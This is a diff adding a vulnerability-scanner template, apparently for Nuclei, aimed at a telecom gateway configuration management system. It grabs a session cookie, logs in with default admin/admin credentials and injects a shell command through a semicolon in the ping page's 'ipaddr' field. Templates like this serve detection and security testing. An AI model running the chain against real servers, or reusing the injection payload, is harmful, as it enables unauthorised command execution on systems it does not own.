@@ -1,0 +1,80 @@
+id: telecom-gateway-cmd-execution
+info:
+  name: Telecom Gateway Configuration Management System Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Telecom gateway configuration management system has a command execution vulnerability. An attacker can use this vulnerability to execute arbitrary commands on the server.
+  tags: command-execution
+  reference:
+    - https://fofa.info
+
+variables:
+  command: "whoami"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /newlive/manager/index.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?); path=/"
+      - type: word
+        part: body
+        words:
+          - "Name"
+    extractors:
+      - type: regex
+        name: session_id
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?); path=/"
+
+  - raw:
+      - |
+        POST /newlive/manager/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{session_id}}
+
+        Name=admin&Pass=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "电信网关服务器管理后台"
+          - "index-shang.php"
+
+  - raw:
+      - |
+        POST /newlive/manager/ipping.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{session_id}}
+
+        ipaddr=127.0.0.1;{{command}};
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ipping.php"
+          - "isIP(strIP)"
